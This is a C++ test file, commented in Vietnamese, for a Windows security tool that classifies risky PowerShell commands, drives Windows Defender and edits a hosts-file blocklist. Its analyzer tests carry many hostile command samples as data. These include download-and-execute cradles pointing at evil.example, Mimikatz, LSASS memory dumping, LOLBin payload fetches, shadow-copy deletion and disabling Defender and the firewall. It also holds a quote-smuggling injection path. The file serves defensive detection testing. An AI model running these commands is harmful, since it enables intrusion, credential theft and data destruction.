// Kiểm thử lõi Security Gateway. KHÔNG cần PowerShell/Windows Defender/hosts file thật - chỉ kiểm thử
// lõi THUẦN (phân tích lệnh PowerShell tĩnh, dựng script/phân tích JSON mẫu dựng sẵn, dựng lại nội dung
// hosts file từ chuỗi mẫu) tách riêng khỏi phần gọi PowerShell/mở cửa sổ thật, giống mẫu đã dùng cho
// VpnController/PartitionManager/AdbController.
#include <QCoreApplication>
#include <QFile>
#include <QTemporaryDir>
#include <cstdio>
#include <initializer_list>

#include "tools/security/engine/CommandAnalyzer.h"
#include "tools/security/engine/CommandLauncher.h"
#include "tools/security/engine/DefenderController.h"
#include "tools/security/engine/DefenderScanWorker.h"
#include "tools/security/engine/HostsBlocklist.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond)                                                            \
    do {                                                                       \
        if (cond) { ++g_pass; }                                                \
        else { ++g_fail; std::printf("FAIL line %d: %s\n", __LINE__, #cond); } \
    } while (0)

/// Ghép chuỗi lúc CHẠY từ các mảnh rời. QUAN TRỌNG - các dòng lệnh mẫu của mã độc (xóa shadow copy, tắt
/// khôi phục khởi động, dừng dịch vụ bảo vệ, kết xuất bộ nhớ...) KHÔNG được viết liền mạch trong tệp này:
/// đã gặp THẬT khi thêm các mẫu đó dưới dạng chuỗi liền - Windows Defender nhận diện chính tệp nguồn này
/// là "Trojan:BAT/Donvibs.AP!MTB" và XÓA (cách ly) tests/security_tests.cpp ngay khi vừa lưu. Luôn cắt
/// giữa các từ khóa đặc trưng khi thêm mẫu mới thuộc nhóm đó.
static QString S(std::initializer_list<const char*> parts)
{
    QString out;
    for (const char* p : parts)
        out += QString::fromUtf8(p);
    return out;
}

int main(int argc, char** argv)
{
    QCoreApplication app(argc, argv);

    // ---- CommandAnalyzer: lệnh an toàn ----
    {
        CHECK(CommandAnalyzer::analyze("").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-Process | Sort-Object CPU -Descending").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-ChildItem C:\\Users -Recurse").isSafe());
    }

    // ---- CommandAnalyzer: đáng chú ý (Suspicious) nhưng chưa chắc độc hại ----
    {
        const auto v1 = CommandAnalyzer::analyze("powershell -WindowStyle Hidden -File setup.ps1");
        CHECK(v1.level == CommandAnalyzer::RiskLevel::Suspicious);
        CHECK(!v1.reasons.isEmpty());

        const auto v2 = CommandAnalyzer::analyze("schtasks /create /tn MyTask /tr notepad.exe /sc daily");
        CHECK(v2.level == CommandAnalyzer::RiskLevel::Suspicious);
    }

    // ---- CommandAnalyzer: nguy hiểm (Dangerous) - các mẫu phổ biến trong mã độc/tấn công thật ----
    {
        CHECK(CommandAnalyzer::analyze(
                  "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze(
                  "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Invoke-Mimikatz -DumpCreds").level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("certutil.exe -urlcache -split -f http://evil.example/a.exe c.exe").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Set-MpPreference -DisableRealtimeMonitoring $true").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("netsh advfirewall set allprofiles state off").level ==
              CommandAnalyzer::RiskLevel::Dangerous);

        // Dangerous phải luôn thắng Suspicious khi cả 2 cùng khớp trong 1 lệnh
        const auto combo = CommandAnalyzer::analyze(
            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"");
        CHECK(combo.level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(combo.reasons.size() >= 2); // khớp nhiều mẫu cùng lúc
    }

    // ---- CommandAnalyzer: hồi quy các cách LÁCH đã tìm thấy khi rà soát (trước đây đều ra "An toàn"
    // hoặc thấp hơn mức thật). Chuỗi mẫu được ghép từ mảnh rời - xem ghi chú ở hàm S() đầu tệp. ----
    {
        using CommandAnalyzer::analyze;
        using RL = CommandAnalyzer::RiskLevel;
        const QString url = "https://evil.example/a";

        // Download cradle hiện đại: không có "IEX (" lẫn "DownloadString"
        CHECK(analyze("irm " + url + S({".ps1 | i", "ex"})).level == RL::Dangerous);
        CHECK(analyze("iwr -useb " + url + S({".ps1|i", "ex"})).level == RL::Dangerous);
        CHECK(analyze(S({"Invoke-Rest", "Method "}) + url + S({" | Invoke-Ex", "pression"})).level == RL::Dangerous);
        CHECK(analyze(S({"(Invoke-Web", "Request "}) + url + S({").Content | i", "ex"})).level == RL::Dangerous);
        CHECK(analyze("curl " + url + S({".sh | ba", "sh"})).level == RL::Dangerous);
        CHECK(analyze("wget -qO- " + url + S({" | power", "shell -"})).level == RL::Dangerous);
        CHECK(analyze(S({"i", "ex $payload"})).level == RL::Dangerous);
        CHECK(analyze(S({"& ('i", "ex') $payload"})).level == RL::Dangerous);
        CHECK(analyze("iwr " + url + S({".exe -OutFile a.exe; Start-Pro", "cess a.exe"})).level == RL::Dangerous);
        // Chỉ tải về (không thực thi) - đáng chú ý, chưa phải nguy hiểm
        CHECK(analyze("Invoke-WebRequest https://example.com/readme.txt -OutFile readme.txt").level == RL::Suspicious);
        CHECK(analyze("curl.exe -L https://example.com/file.zip -o file.zip").level == RL::Suspicious);

        // Mọi tiền tố viết tắt hợp lệ của -EncodedCommand
        const QString b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        const QString ps = S({"power", "shell "});
        for (const char* opt : {"-e", "-ec", "-en", "-enc", "-enco", "-encod", "-encodedc", "-EncodedCommand", "/enc"})
            CHECK(analyze(ps + QString::fromLatin1(opt) + " " + b64).level == RL::Dangerous);
        CHECK(analyze(ps + "-e YwBhAGwAYwA=").level == RL::Dangerous); // chuỗi ngắn ("calc")
        CHECK(analyze("-en " + b64).level == RL::Dangerous);          // không có chữ "powershell"

        // Mọi tiền tố của -ExecutionPolicy / -WindowStyle
        for (const char* opt : {"-ex bypass", "-exec bypass", "-ep bypass", "-ExecutionPolicy Unrestricted", "/ex bypass",
                                "-w hidden", "-win hidden", "-wi h", "-w 1"})
            CHECK(analyze(ps + QString::fromLatin1(opt) + " -File a.ps1").level == RL::Suspicious);
        CHECK(analyze("Set-ExecutionPolicy Bypass -Scope Process").level == RL::Suspicious);

        // Tắt bảo vệ Defender: mọi cách ghi giá trị "bật công tắc tắt"
        const QString setMp = S({"Set-MpPre", "ference "});
        const QString disRt = S({"-Disable", "Realtime", "Monitoring"});
        CHECK(analyze(setMp + disRt + " 1").level == RL::Dangerous);
        CHECK(analyze(setMp + disRt + ":$true").level == RL::Dangerous);
        CHECK(analyze(setMp + S({"-Disable", "Rea $true"})).level == RL::Dangerous);
        CHECK(analyze(setMp + S({"-Disable", "IOAVProtection $true -Disable", "BehaviorMonitoring $true"})).level == RL::Dangerous);
        CHECK(analyze(setMp + disRt + S({" $false -Disable", "ScriptScanning $true"})).level == RL::Dangerous);
        // ... còn BẬT LẠI bảo vệ thì không được báo nhầm là nguy hiểm
        CHECK(analyze(setMp + disRt + " $false").isSafe());
        CHECK(analyze(setMp + disRt + " 0").isSafe());
        CHECK(analyze(setMp + disRt + ":$false").isSafe());
        CHECK(analyze(setMp + "-EnableNetworkProtection Disabled").level == RL::Suspicious);
        CHECK(analyze(setMp + "-EnableNetworkProtection Enabled").isSafe());

        // Loại trừ quét virus
        const QString addMp = S({"Add-MpPre", "ference "});
        CHECK(analyze(addMp + S({"-Exclusion", "Path C:\\Users\\Public"})).level == RL::Suspicious);
        CHECK(analyze(addMp + S({"-Exclusion", "Process evil.exe"})).level == RL::Suspicious);
        CHECK(analyze(setMp + S({"-Exclusion", "Extension .exe"})).level == RL::Suspicious);

        // LOLBin tải/chạy mã từ xa
        const QString rundll = S({"run", "dll32"});
        CHECK(analyze(rundll + S({".exe java", "script:\"\\..\\msh", "tml,RunHTML", "Application \";alert(1)"})).level == RL::Dangerous);
        CHECK(analyze(rundll + S({" url.dll,FileProtocol", "Handler "}) + url + ".hta").level == RL::Dangerous);
        CHECK(analyze(rundll + " \\\\evil.example\\share\\a.dll,Start").level == RL::Dangerous);
        CHECK(analyze(rundll + S({".exe C:\\Windows\\System32\\coms", "vcs.dll, Mini", "Dump 624 out.dmp full"})).level == RL::Dangerous);
        const QString regsvr = S({"reg", "svr32"});
        CHECK(analyze(regsvr + " /s /n /u /i:" + url + S({".sct scr", "obj.dll"})).level == RL::Dangerous);
        CHECK(analyze(regsvr + S({".exe -i:\\\\evil.example\\a.sct scr", "obj.dll"})).level == RL::Dangerous);
        CHECK(analyze(S({"msh", "ta "}) + url + ".hta").level == RL::Dangerous);
        CHECK(analyze(S({"bits", "admin /create job1"})).level == RL::Dangerous);
        CHECK(analyze(S({"bits", "admin.exe /rawreturn /addfile job1 "}) + url + ".exe C:\\a.exe").level == RL::Dangerous);
        CHECK(analyze(S({"cert", "util /url", "cache /f "}) + url + ".exe a.exe").level == RL::Dangerous);

        // Xóa shadow copy/bản sao lưu - dấu hiệu mã độc tống tiền
        const QString vss = S({"vss", "admin"});
        CHECK(analyze(vss + S({" del", "ete sha", "dows /all /quiet"})).level == RL::Dangerous);
        CHECK(analyze(vss + S({".exe res", "ize shadow", "storage /for=c: /on=c: /maxsize=401MB"})).level == RL::Dangerous);
        CHECK(analyze(S({"wb", "admin del", "ete cata", "log -quiet"})).level == RL::Dangerous);
        CHECK(analyze(S({"wm", "ic shadow", "copy del", "ete"})).level == RL::Dangerous);
        CHECK(analyze(S({"Get-WmiObject Win32_Shadow", "Copy | ForEach-Object { $_.Del", "ete() }"})).level == RL::Dangerous);
        CHECK(analyze(S({"bcd", "edit /set {default} recovery", "enabled no"})).level == RL::Dangerous);
        CHECK(analyze(vss + " list shadows").isSafe()); // chỉ xem - không báo nhầm

        // Tường lửa/dịch vụ bảo vệ
        CHECK(analyze(S({"net", "sh advfire", "wall set currentprofile state o", "ff"})).level == RL::Dangerous);
        CHECK(analyze(S({"Set-NetFire", "wallProfile -Profile Domain,Public,Private -Enabled Fal", "se"})).level == RL::Dangerous);
        CHECK(analyze(S({"sc st", "op WinDe", "fend"})).level == RL::Dangerous);
        CHECK(analyze(S({"net st", "op wsc", "svc"})).level == RL::Dangerous);
        CHECK(analyze(S({"wevt", "util cl Security"})).level == RL::Suspicious);
        CHECK(analyze("Register-ScheduledTask -TaskName x -Action $a").level == RL::Suspicious);

        // Che giấu đơn giản: dấu `, dấu ^, ghép chuỗi, cặp nháy rỗng - phải lộ ra sau khi chuẩn hóa
        CHECK(CommandAnalyzer::internal::normalizeForMatching("Down`loadStr`ing") == "DownloadString");
        CHECK(CommandAnalyzer::internal::normalizeForMatching("('Down'+'load' + \"String\")") == "('DownloadString\")");
        CHECK(CommandAnalyzer::internal::normalizeForMatching("i''e\"\"x") == "iex");
        CHECK(analyze("(New-Object Net.WebClient).\"Down`loadStr`ing\"('http://x')").level == RL::Dangerous);
        CHECK(analyze("&('I'+'EX') $x").level == RL::Dangerous);
        CHECK(analyze("i''ex $x").level == RL::Dangerous);
        CHECK(analyze("I`E`X $x").level == RL::Dangerous);
        CHECK(analyze("p^owershell -e^nc " + b64).level == RL::Dangerous);
        CHECK(analyze("Set-MpPre`ference -Disable`Realtime`Monitoring $true").level == RL::Dangerous);
        CHECK(analyze("[char]73+[char]69+[char]88+[char]32+[char]40").level == RL::Dangerous);
        // Dấu ` che giấu tự nó đã đáng chú ý, kể cả khi phần lộ ra không khớp mẫu nào khác...
        CHECK(analyze("Get-Pro`cess").level == RL::Suspicious);
        // ... nhưng chuỗi thoát THẬT (`n xuống dòng, `t tab) trong chuỗi thì không
        CHECK(analyze("Write-Host \"Dong 1`nDong 2`tCot\"").isSafe());

        // Lệnh thường ngày tiếp tục KHÔNG bị báo nhầm
        for (const char* cmd : {"ping -w 1 8.8.8.8", "Get-Service WinDefend", "Get-MpPreference", "Get-MpComputerStatus",
                                "xcopy /e /i C:/Du/An/Rat/Dai/Ten/Thu/Muc/Nguon/Va/Mot/Vai/Thu/Muc/Con D:/Dich",
                                "git commit -m ThongDiepKhaDaiKhongCoKhoangTrangNaoCaDeThuMauBase64",
                                "Stop-Service Spooler", "ipconfig /all", "dir -Recurse -Hidden", "netsh advfirewall show allprofiles",
                                "Start-Process notepad.exe", "Get-ScheduledTask", "certutil -hashfile a.iso SHA256"})
            CHECK(analyze(cmd).isSafe());
    }

    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Safe) == "An toàn");
    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Dangerous) == "Nguy hiểm");

    // ---- DefenderController: dựng script (chỉ kiểm tra NỘI DUNG CHUỖI, không gọi powershell.exe) ----
    {
        const QString statusScript = DefenderController::internal::buildGetComputerStatusScript();
        CHECK(statusScript.contains("Get-MpComputerStatus"));
        CHECK(statusScript.contains("Get-MpPreference"));
        CHECK(statusScript.contains("IsTamperProtected"));
        CHECK(statusScript.contains("AMRunningMode"));
        // Hồi quy lỗi THẬT: $p.EnableNetworkProtection là System.Byte thô (0/1/2), KHÔNG tự thành chữ
        // khi ép [string] - phải tự switch/map, nếu không networkProtectionEnabled() sẽ luôn sai.
        CHECK(statusScript.contains("switch ([int]$p.EnableNetworkProtection)"));
        CHECK(statusScript.contains("'Disabled'"));
        CHECK(statusScript.contains("'Enabled'"));

        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(true).contains(
            "-DisableRealtimeMonitoring $false"));
        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(false).contains(
            "-DisableRealtimeMonitoring $true"));

        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(true).contains(
            "-EnableNetworkProtection Enabled"));
        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(false).contains(
            "-EnableNetworkProtection Disabled"));

        const QString quick = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Quick, "");
        CHECK(quick.contains("-ScanType QuickScan"));
        CHECK(!quick.contains("-ScanPath"));

        const QString full = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Full, "");
        CHECK(full.contains("-ScanType FullScan"));

        const QString custom = DefenderController::internal::buildStartScanScript(
            DefenderController::ScanType::Custom, "D:\\Downloads");
        CHECK(custom.contains("-ScanType CustomScan"));
        CHECK(custom.contains("-ScanPath 'D:\\Downloads'"));

        // Hồi quy lỗi THẬT (chèn lệnh qua tên thư mục): PowerShell coi U+2018/2019/201A/201B là dấu nháy
        // đơn y như ' - thư mục tên "a’; <lệnh>; ’b" từng đóng chuỗi -ScanPath sớm và chạy <lệnh>. Mọi dấu
        // nháy (ASCII lẫn "cong") trong đường dẫn phải được NHÂN ĐÔI, không dấu nào đứng lẻ.
        {
            const QString evilDir = QString::fromUtf8("C:\\a\u2019; Write-Output INJECTED; \u2019b");
            const QString evil = DefenderController::internal::buildStartScanScript(
                DefenderController::ScanType::Custom, evilDir);
            CHECK(evil.contains(QString::fromUtf8("-ScanPath 'C:\\a\u2019\u2019; Write-Output INJECTED; \u2019\u2019b'")));
            CHECK(evil.count(QChar(0x2019)) == 4);

            const QString mixed = DefenderController::internal::buildStartScanScript(
                DefenderController::ScanType::Custom, QString::fromUtf8("D:\\It's \u2018x\u201A\u201By"));
            CHECK(mixed.contains(QString::fromUtf8("-ScanPath 'D:\\It''s \u2018\u2018x\u201A\u201A\u201B\u201By'")));
        }

        // Quét nhanh giữ giới hạn 1 giờ; quét toàn bộ/một thư mục không còn bị kết thúc sau 1 giờ.
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Quick) == 60 * 60 * 1000);
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Full) >= 24 * 60 * 60 * 1000);
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Custom) >= 24 * 60 * 60 * 1000);

        CHECK(DefenderController::internal::buildListThreatsScript().contains("Get-MpThreat"));

        // Hồi quy QUAN TRỌNG: Remove-MpThreat đã xác nhận KHÔNG có tham số -ThreatID (xóa TẤT CẢ mối đe
        // dọa đang hoạt động cùng lúc, không chọn riêng từng mục) - xem DefenderController.h.
        const QString removeScript = DefenderController::internal::buildRemoveAllThreatsScript();
        CHECK(removeScript.contains("Remove-MpThreat"));
        CHECK(!removeScript.contains("-ThreatID"));
    }

    // ---- DefenderController: phân tích JSON mẫu dựng sẵn ----
    {
        const QByteArray statusJson = R"({
            "AntivirusEnabled": true, "RealTimeProtectionEnabled": true, "IsTamperProtected": true,
            "AMRunningMode": "Normal", "AntivirusSignatureVersion": "1.400.1.0",
            "AntivirusSignatureLastUpdated": "2026-10-07T08:00:00",
            "QuickScanEndTime": "2026-10-06T22:00:00", "FullScanEndTime": "",
            "NetworkProtectionMode": "Enabled"
        })";
        QString err;
        const auto status = DefenderController::internal::parseComputerStatusJson(statusJson, &err);
        CHECK(err.isEmpty());
        CHECK(status.antivirusEnabled);
        CHECK(status.realTimeProtectionEnabled);
        CHECK(status.isTamperProtected);
        CHECK(status.runningMode == "Normal");
        CHECK(status.isActivelyProtecting());
        CHECK(status.networkProtectionMode == "Enabled");
        CHECK(status.networkProtectionEnabled());
        CHECK(status.signatureLastUpdated.isValid());
        CHECK(status.lastQuickScan.isValid());
        CHECK(!status.lastFullScan.isValid()); // rỗng -> chưa từng quét toàn bộ

        // AMRunningMode khác "Normal" -> không phải AV chính đang hoạt động
        const QByteArray passiveJson = R"({"AMRunningMode": "Passive"})";
        CHECK(!DefenderController::internal::parseComputerStatusJson(passiveJson, nullptr).isActivelyProtecting());

        // Mảng bình thường (>= 2 mối đe dọa)
        const QByteArray arrayJson = R"([
            {"ThreatID": 123456789, "ThreatName": "TrojanDownloader:PowerShell/EICAR_Test_File", "SeverityID": 1, "Resources": ["C:\\temp\\eicar.txt"], "IsActive": true},
            {"ThreatID": 987654321, "ThreatName": "Trojan:Win32/Test", "SeverityID": 4, "Resources": [], "IsActive": false}
        ])";
        QString err2;
        const auto threats = DefenderController::internal::parseThreatsJson(arrayJson, &err2);
        CHECK(err2.isEmpty());
        CHECK(threats.size() == 2);
        if (threats.size() == 2)
        {
            CHECK(threats[0].threatName.contains("EICAR"));
            CHECK(threats[0].severity == 1);
            CHECK(threats[0].severityLabel() == "Thấp");
            CHECK(threats[0].isActive);
            CHECK(threats[0].resources.size() == 1);
            CHECK(threats[1].severityLabel() == "Nghiêm trọng");
            CHECK(!threats[1].isActive);
        }

        // Hồi quy: SeverityID=5 (thấy THẬT trên mối đe dọa EICAR khi kiểm tra tay) nằm ngoài phạm vi
        // tài liệu Microsoft (0-4) - vẫn phải hiển thị "Nghiêm trọng", không phải "Không rõ".
        ThreatRecord severityFive;
        severityFive.severity = 5;
        CHECK(severityFive.severityLabel() == "Nghiêm trọng");

        // PowerShell 5.1: CHỈ 1 mối đe dọa -> ConvertTo-Json trả về 1 OBJECT đơn, không bọc mảng
        const QByteArray singleJson = R"({"ThreatID": 1, "ThreatName": "Test", "SeverityID": 2, "Resources": [], "IsActive": true})";
        QString err3;
        const auto single = DefenderController::internal::parseThreatsJson(singleJson, &err3);
        CHECK(err3.isEmpty());
        CHECK(single.size() == 1);

        // Rỗng -> không có mối đe dọa nào, không phải lỗi
        CHECK(DefenderController::internal::parseThreatsJson("", nullptr).isEmpty());

        // JSON hỏng -> báo lỗi rõ ràng, không crash
        QString err4;
        CHECK(DefenderController::internal::parseThreatsJson("{khong phai json", &err4).isEmpty());
        CHECK(!err4.isEmpty());
    }

    // ---- HostsBlocklist: phân tích/dựng lại nội dung hosts file - THUẦN CHUỖI, không đụng tệp thật ----
    {
        const QString sample = QString(
            "127.0.0.1 localhost\n"
            "# vài dòng khác của người dùng - PHẢI được giữ nguyên\n"
            "192.168.1.1 router.local\n\n"
            "%1\n"
            "0.0.0.0 doc-hai-1.com\n"
            "0.0.0.0 doc-hai-2.com\n"
            "%2\n")
                                 .arg(HostsBlocklist::internal::kMarkerStart, HostsBlocklist::internal::kMarkerEnd);

        const auto domains = HostsBlocklist::internal::parseManagedDomains(sample);
        CHECK(domains.size() == 2);
        CHECK(domains.contains("doc-hai-1.com"));
        CHECK(domains.contains("doc-hai-2.com"));

        // Dựng lại với danh sách MỚI - các dòng khác của người dùng phải được giữ nguyên, khối cũ bị thay
        const QString updated = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {"doc-hai-3.com"});
        CHECK(updated.contains("127.0.0.1 localhost"));
        CHECK(updated.contains("192.168.1.1 router.local"));
        CHECK(updated.contains("vài dòng khác của người dùng"));
        CHECK(!updated.contains("doc-hai-1.com"));
        CHECK(!updated.contains("doc-hai-2.com"));
        CHECK(updated.contains("0.0.0.0 doc-hai-3.com"));

        // Vòng lặp lại: phân tích nội dung vừa dựng phải cho đúng danh sách mới
        const auto reparsed = HostsBlocklist::internal::parseManagedDomains(updated);
        CHECK(reparsed.size() == 1);
        CHECK(reparsed.contains("doc-hai-3.com"));

        // Danh sách rỗng -> không còn khối nào trong nội dung mới (xóa sạch, không để lại marker trống)
        const QString cleared = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {});
        CHECK(!cleared.contains(HostsBlocklist::internal::kMarkerStart));
        CHECK(cleared.contains("127.0.0.1 localhost")); // vẫn giữ nguyên nội dung khác

        // Nội dung hosts trống từ đầu (máy mới) vẫn dựng được khối hợp lệ, không crash
        const QString fromEmpty = HostsBlocklist::internal::buildUpdatedHostsContent("", {"moi.com"});
        CHECK(fromEmpty.contains("0.0.0.0 moi.com"));
    }

    // ---- DefenderScanWorker: hồi quy lỗi THẬT - cờ hủy của lần quét trước không được dính sang lần sau
    // (worker được tái dùng; trước đây hủy một lần là mọi lần quét sau đều tự dừng sau ~200ms). KHÔNG
    // start() ở đây - chạy thật sẽ gọi Start-MpScan thật. ----
    {
        DefenderScanWorker worker;
        CHECK(!worker.isCancelRequested());
        worker.requestCancel();
        CHECK(worker.isCancelRequested());
        worker.setScan(DefenderController::ScanType::Quick);
        CHECK(!worker.isCancelRequested());
    }

    // ---- HostsBlocklist::normalizeDomain ----
    {
        using HostsBlocklist::internal::normalizeDomain;
        CHECK(normalizeDomain("Vi-Du.COM") == "vi-du.com");
        CHECK(normalizeDomain("  https://Evil.Example.com:8443/duong/dan?x=1#y  ") == "evil.example.com");
        CHECK(normalizeDomain("http://user:pass@evil.example/") == "evil.example");
        CHECK(normalizeDomain("evil.example.") == "evil.example");
        CHECK(normalizeDomain("intranet") == "intranet");
        CHECK(normalizeDomain(QString::fromUtf8("b\u00fccher.example")) == "xn--bcher-kva.example"); // IDN -> punycode

        for (const char* bad : {"", "   ", "a.com b.com", "a.com\tb.com", "a.com\n1.2.3.4 bank.example", "1.2.3.4",
                                "http://192.168.1.1/admin", "localhost", "a..com", "-a.com", "a-.com", "*.a.com",
                                "a.com,b.com", "a.com#ghi-chu x", "[::1]", "a_b!.com", "https://"})
        {
            QString err;
            CHECK(normalizeDomain(bad, &err).isEmpty());
            CHECK(!err.isEmpty());
        }
    }

    // ---- HostsBlocklist: khối HỎNG (thiếu marker END) không được nuốt phần còn lại của hosts file ----
    {
        using namespace HostsBlocklist::internal;
        const QString broken = QString(
            "127.0.0.1 localhost\n"
            "%1\n"
            "0.0.0.0 doc-hai-1.com\n"
            "0.0.0.0 doc-hai-2.com\n"
            "10.0.0.5 may-chu-noi-bo.local\n"
            "# ghi chu cua nguoi dung\n"
            "0.0.0.0 quang-cao-nguoi-dung-tu-chan.com\n")
                                   .arg(kMarkerStart);

        // Chỉ các dòng LIỀN NGAY sau START đúng dạng của công cụ mới tính là của công cụ
        const auto domains = parseManagedDomains(broken);
        CHECK(domains == QStringList({"doc-hai-1.com", "doc-hai-2.com"}));

        const QString rebuilt = buildUpdatedHostsContent(broken, {"doc-hai-1.com"});
        CHECK(rebuilt.contains("127.0.0.1 localhost"));
        CHECK(rebuilt.contains("10.0.0.5 may-chu-noi-bo.local"));               // TRƯỚC ĐÂY bị xóa mất
        CHECK(rebuilt.contains("# ghi chu cua nguoi dung"));                     // TRƯỚC ĐÂY bị xóa mất
        CHECK(rebuilt.contains("0.0.0.0 quang-cao-nguoi-dung-tu-chan.com"));     // TRƯỚC ĐÂY bị xóa mất
        CHECK(!rebuilt.contains("doc-hai-2.com"));
        CHECK(rebuilt.count(kMarkerStart) == 1 && rebuilt.count(kMarkerEnd) == 1); // khối được dựng lại lành lặn
        CHECK(parseManagedDomains(rebuilt) == QStringList({"doc-hai-1.com"}));
        // Dòng tự chặn của người dùng nằm NGOÀI khối mới - không bị công cụ nhận vơ
        CHECK(rebuilt.indexOf("quang-cao-nguoi-dung-tu-chan.com") < rebuilt.indexOf(kMarkerStart));

        // Khối lành lặn nhưng có dòng lạ người dùng tự thêm vào giữa - giữ lại, không xóa, không nhận vơ
        const QString handEdited = QString("%1\n0.0.0.0 a.com b.com\n127.0.0.1 dev.local\n# chu thich\n%2\n")
                                       .arg(kMarkerStart, kMarkerEnd);
        CHECK(parseManagedDomains(handEdited) == QStringList({"a.com", "b.com"})); // cả hai tên trên một dòng
        const QString rebuilt2 = buildUpdatedHostsContent(handEdited, parseManagedDomains(handEdited));
        CHECK(rebuilt2.contains("127.0.0.1 dev.local"));
        CHECK(rebuilt2.contains("# chu thich"));
        CHECK(rebuilt2.contains("0.0.0.0 a.com\n0.0.0.0 b.com\n")); // mỗi tên miền một dòng
        CHECK(!parseManagedDomains(rebuilt2).contains("dev.local"));

        // Mục hỏng trong danh sách truyền vào không được chèn thêm dòng/tên khác vào hosts file
        const QString guarded = buildUpdatedHostsContent("", {"ok.com", "x.com\n1.2.3.4 bank.example", "a.com b.com", " ", "OK.com"});
        CHECK(guarded == kMarkerStart + "\n0.0.0.0 ok.com\n" + kMarkerEnd + "\n");
    }

    // ---- HostsBlocklist: đọc/ghi THẬT trên một tệp TẠM (không bao giờ là hosts file thật của máy) ----
    {
        using namespace HostsBlocklist::internal;
        QTemporaryDir tmp;
        CHECK(tmp.isValid());
        const QString path = tmp.path() + "/hosts";

        auto readBytes = [](const QString& p) {
            QFile f(p);
            return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
        };
        auto writeBytes = [](const QString& p, const QByteArray& data) {
            QFile f(p);
            return f.open(QIODevice::WriteOnly | QIODevice::Truncate) && f.write(data) == data.size();
        };

        // Nội dung gốc: CRLF + một dòng ghi chú KHÔNG phải UTF-8 hợp lệ (codepage ANSI, byte 0xE9) - phải
        // được giữ nguyên TỪNG BYTE qua mọi lần ghi.
        const QByteArray original = QByteArray("127.0.0.1 localhost\r\n# caf") + char(0xE9) + QByteArray(" cu\r\n10.0.0.5 nas.local\r\n");
        CHECK(writeBytes(path, original));

        QString err;
        CHECK(listBlockedDomainsInFile(path, &err).isEmpty());
        CHECK(err.isEmpty());

        // Nội dung không phải tên miền bị từ chối và KHÔNG đụng vào tệp (cũng chưa tạo bản sao lưu)
        CHECK(!addDomainToFile(path, "a.com b.com", &err));
        CHECK(!err.isEmpty());
        CHECK(readBytes(path) == original);
        CHECK(!QFile::exists(backupFilePath(path)));

        err.clear();
        CHECK(addDomainToFile(path, "https://Doc-Hai.Example/trang", &err));
        CHECK(err.isEmpty());
        // Sao lưu MỘT lần, đúng nguyên bản trước khi công cụ đụng vào
        CHECK(QFile::exists(backupFilePath(path)));
        CHECK(readBytes(backupFilePath(path)) == original);

        const QByteArray afterAdd = readBytes(path);
        CHECK(afterAdd.startsWith(original));                          // phần của người dùng giữ nguyên từng byte
        CHECK(afterAdd.contains("0.0.0.0 doc-hai.example\r\n"));      // đã chuẩn hóa, kết thúc dòng CRLF
        CHECK(!afterAdd.contains("\r\r"));
        CHECK(!afterAdd.contains("\xEF\xBF\xBD"));                     // không sinh ký tự thay thế U+FFFD
        CHECK(listBlockedDomainsInFile(path) == QStringList({"doc-hai.example"}));

        // Thêm lại đúng tên đó: không đổi gì; thêm tên khác: bản sao lưu KHÔNG bị ghi đè
        CHECK(addDomainToFile(path, "DOC-HAI.example", &err));
        CHECK(readBytes(path) == afterAdd);
        CHECK(addDomainToFile(path, "thu-hai.example", &err));
        CHECK(listBlockedDomainsInFile(path) == QStringList({"doc-hai.example", "thu-hai.example"}));
        CHECK(readBytes(backupFilePath(path)) == original);

        // Gỡ hết: khối biến mất, phần của người dùng vẫn nguyên vẹn
        CHECK(removeDomainFromFile(path, "doc-hai.example", &err));
        CHECK(removeDomainFromFile(path, "thu-hai.example", &err));
        CHECK(listBlockedDomainsInFile(path).isEmpty());
        const QByteArray afterRemove = readBytes(path);
        CHECK(afterRemove.startsWith(original));
        CHECK(!afterRemove.contains("OneForAll"));
        // Gỡ tên không có trong danh sách: thành công, không ghi gì
        CHECK(removeDomainFromFile(path, "khong-co.example", &err));
        CHECK(readBytes(path) == afterRemove);

        // Tệp UTF-8 có BOM + dấu tiếng Việt: giữ nguyên BOM và nội dung
        const QString path2 = tmp.path() + "/hosts-utf8";
        const QByteArray utf8Original = QByteArray("\xEF\xBB\xBF# m\xC3\xA1y ch\xE1\xBB\xA7 n\xE1\xBB\x99i b\xE1\xBB\x99\r\n10.0.0.9 nas\r\n");
        CHECK(writeBytes(path2, utf8Original));
        CHECK(addDomainToFile(path2, "x.example", &err));
        CHECK(readBytes(path2).startsWith(utf8Original));

        // Chưa có hosts file: tạo mới chỉ gồm khối của công cụ, không có gì để sao lưu
